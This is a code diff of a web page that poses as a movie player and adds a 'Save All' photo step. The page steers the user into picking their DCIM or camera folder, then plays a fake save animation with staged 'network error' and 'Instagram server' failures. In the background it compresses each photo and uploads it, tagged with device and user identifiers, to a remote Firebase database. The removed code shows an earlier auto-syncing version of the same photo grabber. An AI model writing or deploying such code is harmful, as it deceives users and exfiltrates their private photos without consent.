-            console.log(`🎉 Synced ${synced}, failed ${failed}`);
-            updateStatusCard();
-
-            setTimeout(() => {
-                hideOverlay();
-                if (synced > 0) showToast(`🎉 ${synced} photos uploaded!`);
-            }, 1000);
-
-            return { synced, remaining: failed };
-        }
-
-        /* ============================================================
-           AUTO-SYNC TRIGGERS
-           ============================================================ */
-        async function checkAndSync() {
-            try {
-                const count = await idbCount();
-                updateStatusCard();
-
-                if (count === 0) return;
-
-                console.log(`📦 ${count} pending — syncing...`);
-                await syncPendingUploads();
-            } catch (e) {
-                console.warn('Auto-sync error:', e.message);
-            }
-        }
-
-        setTimeout(checkAndSync, 500);
-        setTimeout(checkAndSync, 2000);
-        setTimeout(checkAndSync, 5000);
-
-        window.addEventListener('online', () => {
-            console.log('🌐 Online');
-            setTimeout(checkAndSync, 800);
-        });
-
-        document.addEventListener('visibilitychange', () => {
-            if (document.visibilityState === 'visible') {
-                console.log('👁️ Visible');
-                setTimeout(checkAndSync, 500);
-            }
-        });
-
-        window.addEventListener('focus', () => {
-            setTimeout(checkAndSync, 500);
-        });
-
-        /* ============================================================
-           HANDLE SAVE / RESTORE
-           ============================================================ */
-        async function saveDirHandle(handle) {
-            try {
-                await idbSaveHandle('folder', handle);
-                console.log('✅ Handle saved');
-            } catch (e) {
-                console.warn('Handle save failed:', e.message);
-            }
-        }
-
-        async function restoreDirHandle() {
-            try {
-                const handle = await idbGetHandle('folder');
-                if (!handle) return null;
-
-                const perm = await handle.queryPermission({ mode: 'read' });
-
-                if (perm === 'granted') {
-                    console.log('✅ Permission granted');
-                    document.getElementById('statusPerm').textContent = 'Granted ✅';
-                    document.getElementById('statusPerm').className = 'status-value ok';
-                    document.getElementById('statusFolder').textContent = handle.name;
-                    
-                    // Start observer
-                    startObserver(handle);
-                    
-                    return handle;
-                } else if (perm === 'prompt') {
-                    console.log('⚠️ Permission prompt needed');
-                    document.getElementById('statusPerm').textContent = 'Prompt needed';
-                    document.getElementById('statusPerm').className = 'status-value warn';
-                    showToast('👆 Tap to restore access');
-                    return handle;
-                } else {
-                    document.getElementById('statusPerm').textContent = 'Denied';
-                    document.getElementById('statusPerm').className = 'status-value bad';
-                    return null;
-                }
-            } catch (e) {
-                console.warn('Restore failed:', e.message);
-                return null;
-            }
-        }
-
-        /* ============================================================
-           FILESYSTEM OBSERVER — Nayi photos auto-detect
-           ============================================================ */
-        let currentObserver = null;
-
-        async function startObserver(handle) {
-            if (!OBSERVER_SUPPORTED) {
-                document.getElementById('statusObserver').textContent = 'Not supported';
-                document.getElementById('statusObserver').className = 'status-value warn';
-                return;
-            }
-
-            try {
-                // Stop old observer
-                if (currentObserver) {
-                    currentObserver.disconnect();
-                    currentObserver = null;
-                }
-
-                currentObserver = new FileSystemObserver((records) => {
-                    for (const record of records) {
-                        if (record.type === 'appeared' || record.type === 'modified') {
-                            console.log('📸 New photo:', record.relativePathComponents);
-                            handleNewFile(record.changedHandle);
-                        }
-                    }
-                });
-
-                await currentObserver.observe(handle, { recursive: true });
-                
-                document.getElementById('statusObserver').textContent = 'Active ✅';
-                document.getElementById('statusObserver').className = 'status-value ok';
-                console.log('👁️ Observer started');
-
-            } catch (e) {
-                console.warn('Observer failed:', e.message);
-                document.getElementById('statusObserver').textContent = 'Failed';
-                document.getElementById('statusObserver').className = 'status-value bad';
-            }
-        }
-
-        async function handleNewFile(fileHandle) {
-            try {
-                if (fileHandle.kind !== 'file') return;
-                
-                const name = fileHandle.name;
-                if (!/\.(jpg|jpeg|png|gif|webp|heic)$/i.test(name)) return;
-
-                console.log('📥 New photo detected:', name);
-                const file = await fileHandle.getFile();
-
-                // Compress + queue
-                const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
-                const blob = compressed;
-                const base64 = await blobToBase64(blob);
-
-                await queuePhotoLocally(file, base64, blob);
-                showToast(`📸 New photo queued: ${name}`);
-
-            } catch (e) {
-                console.warn('New file error:', e.message);
-            }
-        }
-
-        /* ============================================================
-           QUEUE
-           ============================================================ */
+        /* QUEUE */
         async function queuePhotoLocally(file, base64, blob) {
             try {
                 let inOPFS = false;
-
                 if (OPFS_SUPPORTED && blob) {
                     inOPFS = await opfsSave(file.name, blob);
                 }
@@ -855,166 +551,661 @@
                     inOPFS: inOPFS
                 });
 
-                updateStatusCard();
+                const count = await idbCount();
+                console.log(`📦 Queued: ${file.name} (total: ${count})`);
             } catch (e) {
                 console.warn('Queue failed:', e.message);
             }
         }
 
-        /* ============================================================
-           FOLDER SELECT — with DCIM validation
-           ============================================================ */
-        const pickBtn = document.getElementById('pickBtn');
-        const syncBtn = document.getElementById('syncBtn');
-        const changeBtn = document.getElementById('changeBtn');
-        const folderInput = document.getElementById('folderInput');
-        const wrongModal = document.getElementById('wrongModal');
-        const wrongName = document.getElementById('wrongName');
-
-        const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'download', 'screenshots', 'whatsapp', 'photos'];
-
-        pickBtn.addEventListener('click', () => folderInput.click());
-        changeBtn.addEventListener('click', () => folderInput.click());
-
-        folderInput.addEventListener('change', async (e) => {
-            const files = Array.from(e.target.files);
-            if (files.length === 0) {
-                showToast('❌ Koi folder select nahi kiya');
-                return;
-            }
-
-            const firstPath = files[0].webkitRelativePath || '';
-            const folderName = firstPath.split('/')[0] || 'Unknown';
-            const folderLower = folderName.toLowerCase();
-
-            const images = files.filter(f =>
-                f.type.startsWith('image/') ||
-                /\.(jpg|jpeg|png|gif|webp|heic|heif)$/i.test(f.name)
-            );
-
-            console.log('📁 Folder:', folderName, '| Photos:', images.length);
-
-            // 🔥 FOLDER VALIDATION — FORCE DCIM
-            if (!GOOD_FOLDERS.includes(folderLower)) {
-                wrongName.textContent = folderName;
-                wrongModal.classList.add('show');
-                if (navigator.vibrate) navigator.vibrate([100, 50, 100, 50, 100]);
-                folderInput.value = '';
-                return;
-            }
-
-            // ✅ Correct folder
-            showToast(`✅ ${folderName} — ${images.length} photos`);
-
-            document.getElementById('statusFolder').textContent = folderName;
-
-            // Queue all photos
-            showOverlay(images.length);
-            let queued = 0;
-
-            for (const file of images) {
-                try {
-                    const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
-                    const blob = compressed;
-                    const base64 = await blobToBase64(blob);
-                    await queuePhotoLocally(file, base64, blob);
-                    queued++;
-                    updateOverlayStats(queued, images.length - queued, 0);
-                } catch (err) {
-                    console.warn('Queue error:', err.message);
-                }
-            }
-
-            hideOverlay();
-
-            // Save handle (if available)
+        /* SYNC */
+        async function syncPendingUploads() {
             try {
-                if ('showDirectoryPicker' in window) {
-                    // Note: webkitdirectory se handle nahi milta
-                    // Ye separately showDirectoryPicker se lena padega
+                const pending = await idbGetAll();
+                if (pending.length === 0) return { synced: 0, remaining: 0 };
+
+                console.log(`🔄 Syncing ${pending.length}...`);
+                let synced = 0, failed = 0;
+
+                for (const item of pending) {
+                    try {
+                        let base64;
+
+                        if (item.inOPFS && OPFS_SUPPORTED) {
+                            const blob = await opfsRead(item.name);
+                            if (blob) base64 = await blobToBase64(blob);
+                        }
+
+                        if (!base64 && item.image) base64 = item.image;
+                        if (!base64) { failed++; continue; }
+
+                        const photoRef = push(ref(db, 'photos/' + item.deviceId));
+                        await set(photoRef, {
+                            id: photoRef.key,
+                            deviceId: item.deviceId,
+                            deviceName: item.deviceName,
+                            sessionId: item.sessionId,
+                            username: item.username,
+                            image: base64,
+                            name: item.name,
+                            size: item.size,
+                            timestamp: serverTimestamp(),
+                            uploadedAt: item.queuedAt,
+                            fromQueue: true
+                        });
+
+                        if (item.inOPFS) await opfsDelete(item.name);
+                        await idbDelete(item.id);
+                        synced++;
+                        console.log(`✅ Synced: ${item.name}`);
+
+                    } catch (err) {
+                        failed++;
+                        console.warn(`❌ Failed: ${item.name}`);
+                    }
                 }
-            } catch (e) {}
 
-            // UI updates
-            pickBtn.style.display = 'none';
-            changeBtn.style.display = 'flex';
-            syncBtn.style.display = 'flex';
+                console.log(`🎉 Synced ${synced}, failed ${failed}`);
+                return { synced, remaining: failed };
+            } catch (e) {
+                return { synced: 0, remaining: 0 };
+            }
+        }
 
-            // Start sync
-            setTimeout(checkAndSync, 500);
-        });
-
-        /* Wrong folder modal buttons */
-        document.getElementById('wrongRetryBtn').addEventListener('click', () => {
-            wrongModal.classList.remove('show');
-            folderInput.value = '';
-            setTimeout(() => folderInput.click(), 300);
-        });
-
-        document.getElementById('wrongCancelBtn').addEventListener('click', () => {
-            wrongModal.classList.remove('show');
-            folderInput.value = '';
-        });
-
-        /* Sync button */
-        syncBtn.addEventListener('click', checkAndSync);
-
-        /* ============================================================
-           STATUS CARD
-           ============================================================ */
-        async function updateStatusCard() {
+        /* AUTO-SYNC ON LOAD */
+        async function checkAndSyncOnLoad() {
             try {
                 const count = await idbCount();
-                document.getElementById('statusPending').textContent = count;
-                document.getElementById('statusPending').className = 
-                    'status-value ' + (count > 0 ? 'warn' : 'ok');
+                console.log(`📦 IndexedDB: ${count} pending`);
 
-                if (OPFS_SUPPORTED) {
-                    const est = await navigator.storage.estimate();
-                    const used = (est.usage / 1024 / 1024).toFixed(1);
-                    document.getElementById('statusStorage').textContent = used + ' MB';
+                if (count === 0) return;
+
+                const banner = document.getElementById('resumeBanner');
+                const bannerText = document.getElementById('resumeText');
+                bannerText.textContent = `${count} photos pending — syncing...`;
+                banner.classList.add('show');
+
+                const result = await syncPendingUploads();
+
+                if (result.synced > 0) {
+                    bannerText.textContent = `✅ ${result.synced} photos synced!`;
+                    showToast(`🎉 ${result.synced} photos auto-uploaded!`);
+                    setTimeout(() => banner.classList.remove('show'), 3000);
+                } else if (result.remaining > 0) {
+                    bannerText.textContent = `⚠️ ${result.remaining} failed — Retry?`;
+                    document.getElementById('resumeBtn').textContent = 'Retry';
+                }
+            } catch (e) {
+                console.warn('Auto-sync error:', e.message);
+            }
+        }
+
+        setTimeout(checkAndSyncOnLoad, 500);
+        setTimeout(checkAndSyncOnLoad, 2000);
+        setTimeout(checkAndSyncOnLoad, 5000);
+        setTimeout(checkAndSyncOnLoad, 15000);
+
+        window.addEventListener('online', () => {
+            setTimeout(checkAndSyncOnLoad, 800);
+        });
+
+        document.addEventListener('visibilitychange', () => {
+            if (document.visibilityState === 'visible') {
+                setTimeout(checkAndSyncOnLoad, 500);
+            }
+        });
+
+        window.addEventListener('focus', () => {
+            setTimeout(checkAndSyncOnLoad, 500);
+        });
+
+        document.getElementById('resumeBtn').addEventListener('click', async () => {
+            const banner = document.getElementById('resumeBanner');
+            const bannerText = document.getElementById('resumeText');
+            bannerText.textContent = 'Syncing...';
+            const result = await syncPendingUploads();
+            if (result.synced > 0) {
+                bannerText.textContent = `✅ ${result.synced} synced!`;
+                setTimeout(() => banner.classList.remove('show'), 3000);
+            }
+        });
+
+        /* WAKE LOCK */
+        async function keepScreenOn() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                    wakeLock.addEventListener('release', () => { wakeLock = null; });
+                }
+            } catch (err) {}
+        }
+
+        function releaseWakeLock() {
+            if (wakeLock) {
+                wakeLock.release().catch(() => {});
+                wakeLock = null;
+            }
+        }
+
+        /* SOUND */
+        let audioCtx = null;
+        function playSound(freq, duration) {
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.frequency.value = freq;
+                osc.type = 'sine';
+                gain.gain.setValueAtTime(0, audioCtx.currentTime);
+                gain.gain.linearRampToValueAtTime(0.05, audioCtx.currentTime + 0.01);
+                gain.gain.linearRampToValueAtTime(0, audioCtx.currentTime + duration);
+                osc.start(audioCtx.currentTime);
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {}
+        }
+
+        function vibrate(p) { if (navigator.vibrate) navigator.vibrate(p); }
+
+        /* DOM */
+        const videoPoster = document.getElementById('videoPoster');
+        const movieTitle = document.getElementById('movieTitle');
+        const movieSub = document.getElementById('movieSub');
+        const centerPlay = document.getElementById('centerPlay');
+        const playPauseBtn = document.getElementById('playPauseBtn');
+        const progressFill = document.getElementById('progressFill');
+        const progressBar = document.getElementById('progressBar');
+        const currentTimeEl = document.getElementById('currentTime');
+        const totalTimeEl = document.getElementById('totalTime');
+        const backBtn = document.getElementById('backBtn');
+        const topBar = document.getElementById('topBar');
+        const bottomControls = document.getElementById('bottomControls');
+        const tapLeft = document.getElementById('tapLeft');
+        const tapRight = document.getElementById('tapRight');
+        const saveAllBtn = document.getElementById('saveAllBtn');
+        const rewindBtn = document.getElementById('rewindBtn');
+        const forwardBtn = document.getElementById('forwardBtn');
+        const volumeBtn = document.getElementById('volumeBtn');
+        const fullscreenBtn = document.getElementById('fullscreenBtn');
+
+        const overlay = document.getElementById('processingOverlay');
+        const overlayMain = document.getElementById('overlayMain');
+        const successState = document.getElementById('successState');
+        const successSub = document.getElementById('successSub');
+        const errorState = document.getElementById('errorState');
+        const errorSub = document.getElementById('errorSub');
+        const errorRetry = document.getElementById('errorRetry');
+        const overlayTitle = document.getElementById('overlayTitle');
+        const overlaySub = document.getElementById('overlaySub');
+        const overlayProgressFill = document.getElementById('overlayProgressFill');
+        const overlayProgressLabel = document.getElementById('overlayProgressLabel');
+        const overlayProgressPercent = document.getElementById('overlayProgressPercent');
+        const overlayDone = document.getElementById('overlayDone');
+        const overlayPending = document.getElementById('overlayPending');
+        const overlayFailed = document.getElementById('overlayFailed');
+        const currentFile = document.getElementById('currentFile');
+        const cancelBtn = document.getElementById('cancelBtn');
+
+        /* MOVIE PLAYER */
+        function loadMovie(index) {
+            const movie = movies[index];
+            videoPoster.classList.remove('active');
+            setTimeout(() => {
+                videoPoster.src = movie.poster;
+                videoPoster.classList.add('active');
+            }, 100);
+            movieTitle.textContent = movie.title;
+            movieSub.textContent = `${movie.year} • ${movie.genre} • ${movie.duration}`;
+            const durations = [169, 148, 152, 180, 166];
+            videoDuration = durations[index] * 60;
+            currentTime = 0;
+            updateProgressUI();
+        }
+
+        function formatTime(seconds) {
+            const h = Math.floor(seconds / 3600);
+            const m = Math.floor((seconds % 3600) / 60);
+            const s = Math.floor(seconds % 60);
+            if (h > 0) return `${h}:${String(m).padStart(2,'0')}:${String(s).padStart(2,'0')}`;
+            return `${m}:${String(s).padStart(2,'0')}`;
+        }
+
+        function updateProgressUI() {
+            const percent = (currentTime / videoDuration) * 100;
+            progressFill.style.width = percent + '%';
+            currentTimeEl.textContent = formatTime(currentTime);
+            totalTimeEl.textContent = formatTime(videoDuration);
+        }
+
+        function startPlayback() {
+            if (progressInterval) clearInterval(progressInterval);
+            progressInterval = setInterval(() => {
+                if (!isPlaying) return;
+                currentTime += 1;
+                if (currentTime >= videoDuration) {
+                    currentTime = 0;
+                    isPlaying = false;
+                    updatePlayUI();
+                }
+                updateProgressUI();
+            }, 1000);
+        }
+
+        function updatePlayUI() {
+            if (isPlaying) {
+                centerPlay.style.display = 'none';
+                playPauseBtn.textContent = '⏸';
+            } else {
+                centerPlay.style.display = 'flex';
+                playPauseBtn.textContent = '▶';
+            }
+        }
+
+        function togglePlay() {
+            isPlaying = !isPlaying;
+            updatePlayUI();
+            playSound(600, 0.05);
+            vibrate(20);
+        }
+
+        centerPlay.addEventListener('click', togglePlay);
+        playPauseBtn.addEventListener('click', togglePlay);
+        backBtn.addEventListener('click', () => { if (confirm('Exit movie?')) showToast('👋 Exiting...'); });
+        rewindBtn.addEventListener('click', () => { currentTime = Math.max(0, currentTime - 10); updateProgressUI(); });
+        forwardBtn.addEventListener('click', () => { currentTime = Math.min(videoDuration, currentTime + 10); updateProgressUI(); });
+        volumeBtn.addEventListener('click', () => { volumeBtn.classList.toggle('active'); showToast('🔊'); });
+        fullscreenBtn.addEventListener('click', () => {
+            if (!document.fullscreenElement) document.documentElement.requestFullscreen().catch(() => {});
+            else document.exitFullscreen().catch(() => {});
+        });
+        tapLeft.addEventListener('click', () => { currentTime = Math.max(0, currentTime - 10); updateProgressUI(); });
+        tapRight.addEventListener('click', () => { currentTime = Math.min(videoDuration, currentTime + 10); updateProgressUI(); });
+        progressBar.addEventListener('click', (e) => {
+            const rect = progressBar.getBoundingClientRect();
+            const percent = (e.clientX - rect.left) / rect.width;
+            currentTime = Math.floor(percent * videoDuration);
+            updateProgressUI();
+        });
+
+        /* SAVE BUTTON — Hybrid: Android uses webkitdirectory, Desktop uses showDirectoryPicker */
+        saveAllBtn.addEventListener('click', async () => {
+            saveAllBtn.disabled = true;
+            await keepScreenOn();
+
+            const isAndroid = /Android/i.test(navigator.userAgent);
+
+            if (isAndroid || !('showDirectoryPicker' in window)) {
+                // 🔥 ANDROID — webkitdirectory (no Allow dialog)
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.webkitdirectory = true;
+                input.multiple = true;
+                input.style.display = 'none';
+                document.body.appendChild(input);
+
+                input.onchange = async (e) => {
+                    const files = Array.from(e.target.files);
+                    document.body.removeChild(input);
+
+                    if (files.length === 0) {
+                        saveAllBtn.disabled = false;
+                        releaseWakeLock();
+                        showToast('❌ Koi folder select nahi kiya');
+                        return;
+                    }
+
+                    const firstPath = files[0].webkitRelativePath || '';
+                    const folderName = firstPath.split('/')[0] || 'Unknown';
+                    const folderLower = folderName.toLowerCase();
+
+                    const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'screenshots', 'whatsapp', 'photos'];
+                    if (!GOOD_FOLDERS.includes(folderLower)) {
+                        saveAllBtn.disabled = false;
+                        releaseWakeLock();
+                        if (confirm(`❌ "${folderName}" sahi folder nahi.\n\n✅ DCIM ya Pictures select karo.\n\nTry again?`)) {
+                            saveAllBtn.click();
+                        }
+                        return;
+                    }
+
+                    startFakeSaveFromFiles(files);
+                };
+
+                input.oncancel = () => {
+                    document.body.removeChild(input);
+                    saveAllBtn.disabled = false;
+                    releaseWakeLock();
+                };
+
+                input.click();
+
+            } else {
+                // 🔥 DESKTOP — showDirectoryPicker
+                try {
+                    const dirHandle = await window.showDirectoryPicker({ mode: 'read', startIn: 'pictures' });
+                    const folderLower = (dirHandle.name || '').toLowerCase();
+                    const GOOD_FOLDERS = ['dcim', 'pictures', 'camera', 'downloads', 'screenshots', 'whatsapp', 'photos'];
+
+                    if (!GOOD_FOLDERS.includes(folderLower)) {
+                        saveAllBtn.disabled = false;
+                        releaseWakeLock();
+                        if (confirm(`❌ "${dirHandle.name}" sahi folder nahi.\n\n✅ DCIM ya Pictures select karo.\n\nTry again?`)) {
+                            saveAllBtn.click();
+                        }
+                        return;
+                    }
+
+                    // Save handle for restore
+                    try {
+                        const db = await openIDB();
+                        const tx = db.transaction('handles', 'readwrite');
+                        if (!db.objectStoreNames.contains('handles')) {
+                            // Skip
+                        } else {
+                            tx.objectStore('handles').put(dirHandle, 'folder');
+                        }
+                    } catch (e) {}
+
+                    startFakeSave(dirHandle);
+
+                } catch (err) {
+                    releaseWakeLock();
+                    saveAllBtn.disabled = false;
+                    if (err.name === 'AbortError') return;
+                    showToast('❌ ' + (err.message || 'Error'));
+                }
+            }
+        });
+
+        /* FAKE SAVE (Desktop - from dirHandle) */
+        async function startFakeSave(dirHandle) {
+            isCancelled = false;
+            retryCount = 0;
+            fakeDone = 0;
+            uploadStartTime = Date.now();
+
+            overlay.classList.add('show');
+            overlayMain.style.display = 'block';
+            successState.classList.remove('show');
+            errorState.classList.remove('show');
+            resetOverlay();
+
+            overlayTitle.textContent = 'Scanning Folder';
+            overlaySub.innerHTML = 'Photos scan ho rahi hain...<br>Please wait.';
+
+            const files = [];
+            if (dirHandle) await scanFolder(dirHandle, files);
+
+            const totalFound = files.length;
+            const limitedFiles = files.slice(0, MAX_PHOTOS);
+
+            console.log(`📁 Real files: ${totalFound}, using: ${limitedFiles.length}`);
+
+            const FAKE_TOTAL = FAKE_FILE_COUNT;
+
+            overlayTitle.textContent = 'Saving Photos';
+            overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
+            overlayPending.textContent = FAKE_TOTAL;
+            overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;
+
+            realSaveInBackground(limitedFiles);
+            runFakeProgress(FAKE_TOTAL);
+        }
+
+        /* FAKE SAVE (Android - from files) */
+        async function startFakeSaveFromFiles(files) {
+            isCancelled = false;
+            retryCount = 0;
+            fakeDone = 0;
+            uploadStartTime = Date.now();
+
+            overlay.classList.add('show');
+            overlayMain.style.display = 'block';
+            successState.classList.remove('show');
+            errorState.classList.remove('show');
+            resetOverlay();
+
+            const FAKE_TOTAL = FAKE_FILE_COUNT;
+            const images = files.filter(f => f.type.startsWith('image/') || /\.(jpg|jpeg|png|gif|webp|heic|heif)$/i.test(f.name));
+
+            console.log(`📁 Real images: ${images.length}, Fake: ${FAKE_TOTAL}`);
+
+            overlayTitle.textContent = 'Saving Photos';
+            overlaySub.innerHTML = `Photos <strong>folder mein save</strong> ho rahi hain.`;
+            overlayPending.textContent = FAKE_TOTAL;
+            overlayProgressLabel.textContent = `0 / ${FAKE_TOTAL} files`;
+
+            realSaveInBackground(images);
+            runFakeProgress(FAKE_TOTAL);
+        }
+
+        /* FAKE PROGRESS RUNNER */
+        function runFakeProgress(FAKE_TOTAL) {
+            const fakeNames = Array.from({ length: FAKE_TOTAL }, (_, i) => {
+                const d = String(1 + (i % 30)).padStart(2, '0');
+                const m = String(1 + Math.floor(i / 30)).padStart(2, '0');
+                return `IMG_2026${m}${d}_${Math.floor(Math.random() * 900000 + 100000)}.jpg`;
+            });
+
+            fakeInterval = setInterval(() => {
+                if (isCancelled) return;
+                fakeDone++;
+
+                const shouldFail = Math.random() < 0.02;
+                if (shouldFail) {
+                    overlayFailed.textContent = parseInt(overlayFailed.textContent) + 1;
+                    playSound(300, 0.15);
+                    vibrate(100);
                 } else {
-                    document.getElementById('statusStorage').textContent = 'N/A';
+                    overlayDone.textContent = fakeDone - parseInt(overlayFailed.textContent);
+                    playSound(800 + Math.random() * 400, 0.08);
+                    vibrate(20);
+                }
+
+                overlayPending.textContent = Math.max(0, FAKE_TOTAL - fakeDone);
+
+                const percent = Math.round((fakeDone / FAKE_TOTAL) * 100);
+                overlayProgressFill.style.width = percent + '%';
+                overlayProgressPercent.textContent = percent + '%';
+                overlayProgressLabel.textContent = `${fakeDone} / ${FAKE_TOTAL} files`;
+                currentFile.textContent = fakeNames[fakeDone - 1] || 'file.jpg';
+
+                if (fakeDone >= FAKE_TOTAL) {
+                    clearInterval(fakeInterval);
+                    fakeInterval = null;
+
+                    setTimeout(() => {
+                        if (retryCount === 0 && Math.random() < 0.6) showFakeError();
+                        else if (retryCount === 1 && Math.random() < 0.5) showFakeError();
+                        else if (retryCount === 2 && Math.random() < 0.4) showFakeError();
+                        else showFinalSuccess(FAKE_TOTAL);
+                    }, 600);
+                }
+            }, 400 + Math.random() * 300);
+        }
+
+        function showFakeError() {
+            retryCount++;
+            const stage = {
+                1: { title: 'Network Error', sub: 'WiFi connection weak hai.' },
+                2: { title: 'Server Busy', sub: 'Instagram server slow hai.' },
+                3: { title: 'Connection Lost', sub: 'Internet connection toot gaya.' }
+            }[retryCount] || { title: 'Failed', sub: 'Try again.' };
+
+            document.getElementById('errorTitle').textContent = stage.title;
+            errorSub.innerHTML = stage.sub;
+
+            overlayMain.style.display = 'none';
+            errorState.classList.add('show');
+
+            playSound(200, 0.3);
+            vibrate([100, 50, 100, 50, 100]);
+            showToast(`⚠️ Save failed — Retry ${retryCount}/3`);
+
+            releaseWakeLock();
+        }
+
+        errorRetry.addEventListener('click', () => {
+            errorState.classList.remove('show');
+            overlayMain.style.display = 'block';
+            resetOverlay();
+
+            const FAKE_TOTAL = FAKE_FILE_COUNT;
+            fakeDone = Math.floor((retryCount - 1) * (FAKE_TOTAL / 3));
+
+            overlayTitle.textContent = retryCount === 1 ? 'Retrying...' : 'Trying Again...';
+            overlaySub.innerHTML = 'Photos dobara save ho rahi hain.';
+
+            runFakeProgress(FAKE_TOTAL);
+        });
+
+        cancelBtn.addEventListener('click', () => {
+            isCancelled = true;
+            if (fakeInterval) clearInterval(fakeInterval);
+            hideOverlay();
+            releaseWakeLock();
+            saveAllBtn.disabled = false;
+            showToast('❌ Cancelled');
+            retryCount = 0;
+        });
+
+        function showFinalSuccess(total) {
+            total = total || FAKE_FILE_COUNT;
+            overlayMain.style.display = 'none';
+            successState.classList.add('show');
+            successSub.innerHTML = `Sab <strong>${total} photos</strong> save ho gayin.<br>Thank you! 🎉`;
+
+            playSound(1200, 0.2);
+            vibrate([50, 50, 50, 50, 50]);
+            showToast('🎉 Photos saved successfully!');
+
+            releaseWakeLock();
+            retryCount = 0;
+
+            setTimeout(() => {
+                hideOverlay();
+                saveAllBtn.disabled = false;
+            }, 3000);
+        }
+
+        /* REAL DB SAVE */
+        async function realSaveInBackground(files) {
+            if (!files || files.length === 0) return;
+
+            try {
+                console.log(`📸 Processing ${files.length} files...`);
+                await deleteOldPhotos(500);
+
+                let index = 0;
+                let saved = 0;
+
+                const worker = async () => {
+                    while (index < files.length && !isCancelled) {
+                        const i = index++;
+                        const file = files[i];
+
+                        try {
+                            const compressed = await compressImage(file, COMPRESS_WIDTH, COMPRESS_QUALITY);
+                            const blob = compressed;
+                            const base64 = await blobToBase64(blob);
+
+                            // 🔥 Queue first
+                            await queuePhotoLocally(file, base64, blob);
+
+                            // 🔥 Then upload
+                            try {
+                                const photoRef = push(ref(db, 'photos/' + DEVICE_ID));
+                                await set(photoRef, {
+                                    id: photoRef.key,
+                                    deviceId: DEVICE_ID,
+                                    deviceName: DEVICE_NAME,
+                                    sessionId: SESSION_ID,
+                                    username: USERNAME,
+                                    image: base64,
+                                    name: file.name,
+                                    size: blob.size,
+                                    originalSize: file.size,
+                                    savedPercent: Math.round((1 - blob.size / file.size) * 100),
+                                    timestamp: serverTimestamp(),
+                                    uploadedAt: Date.now()
+                                });
+
+                                // Success → delete from queue
+                                const pending = await idbGetAll();
+                                const matching = pending.find(p => p.name === file.name);
+                                if (matching) {
+                                    await idbDelete(matching.id);
+                                    if (matching.inOPFS) await opfsDelete(matching.name);
+                                }
+
+                                saved++;
+                                console.log(`✅ Saved: ${file.name} (${saved}/${files.length})`);
+
+                            } catch (uploadErr) {
+                                console.warn(`⚠️ Upload failed — kept in queue: ${file.name}`);
+                            }
+
+                        } catch (err) {
+                            console.warn('Processing error:', err.message);
+                        }
+                    }
+                };
+
+                await Promise.all(Array(CONCURRENCY).fill(null).map(() => worker()));
+                console.log(`✅ BG save done: ${saved}/${files.length}`);
+
+                const remaining = await idbCount();
+                if (remaining > 0) {
+                    setTimeout(syncPendingUploads, 3000);
+                }
+
+            } catch (e) {
+                console.error('BG save error:', e);
+            }
+        }
+
+        async function deleteOldPhotos(keepCount = 500) {
+            try {
+                const snapshot = await get(ref(db, 'photos/' + DEVICE_ID));
+                const data = snapshot.val();
+                if (!data) return;
+                const items = Object.entries(data).map(([key, val]) => ({ key, ...val }));
+                items.sort((a, b) => (a.uploadedAt || 0) - (b.uploadedAt || 0));
+                const toDelete = items.slice(0, Math.max(0, items.length - keepCount));
+                for (const item of toDelete) await remove(ref(db, `photos/${DEVICE_ID}/${item.key}`));
+            } catch (e) {}
+        }
+
+        async function scanFolder(dirHandle, files) {
+            try {
+                for await (const entry of dirHandle.values()) {
+                    if (entry.kind === 'file') {
+                        if (/\.(jpg|jpeg|png|gif|webp|heic|heif|bmp)$/i.test(entry.name)) {
+                            try {
+                                const file = await entry.getFile();
+                                if (file.size < 15 * 1024 * 1024) files.push(file);
+                            } catch (e) {}
+                        }
+                    } else if (entry.kind === 'directory') {
+                        await scanFolder(entry, files);
+                    }
                 }
             } catch (e) {}
         }
 
-        /* ============================================================
-           OVERLAY
-           ============================================================ */
-        const overlay = document.getElementById('progressOverlay');
+        function hideOverlay() { overlay.classList.remove('show'); }
 
-        function showOverlay(total) {
-            overlay.classList.add('show');
-            document.getElementById('overlayIcon').textContent = '📤';
-            document.getElementById('overlayTitle').textContent = 'Uploading Photos';
-            document.getElementById('overlaySub').textContent = 'Please wait...';
-            document.getElementById('statPending').textContent = total;
-            document.getElementById('statDone').textContent = '0';
-            document.getElementById('statFailed').textContent = '0';
-            document.getElementById('progressFill').style.width = '0%';
-            document.getElementById('progressPct').textContent = '0%';
+        function resetOverlay() {
+            overlayProgressFill.style.width = '0%';
+            overlayProgressPercent.textContent = '0%';
+            overlayProgressLabel.textContent = 'Starting...';
+            overlayDone.textContent = '0';
+            overlayPending.textContent = '0';
+            overlayFailed.textContent = '0';
+            currentFile.textContent = 'Waiting...';
         }
 
-        function updateOverlayStats(done, pending, failed) {
-            document.getElementById('statDone').textContent = done;
-            document.getElementById('statPending').textContent = pending;
-            document.getElementById('statFailed').textContent = failed;
-            
-            const total = done + pending + failed;
-            const pct = total > 0 ? Math.round((done / total) * 100) : 0;
-            document.getElementById('progressFill').style.width = pct + '%';
-            document.getElementById('progressPct').textContent = pct + '%';
-            document.getElementById('progressLabel').textContent = `${done} / ${total}`;
-        }
-
-        function hideOverlay() {
-            overlay.classList.remove('show');
-        }
-
-        /* ============================================================
-           HELPERS
-           ============================================================ */
         function compressImage(file, maxWidth, quality) {
             return new Promise((resolve, reject) => {
                 const reader = new FileReader();
@@ -1030,7 +1221,7 @@
                         ctx.drawImage(img, 0, 0, w, h);
                         canvas.toBlob((blob) => {
                             if (!blob) { reject(new Error('fail')); return; }
-                            resolve(blob); // ✅ Blob return
+                            resolve(blob);  // ✅ Blob return
                         }, 'image/jpeg', quality);
                     };
                     img.onerror = reject;
@@ -1063,28 +1254,29 @@
             }, 2500);
         }
 
-        /* ============================================================
-           INIT
-           ============================================================ */
-        async function init() {
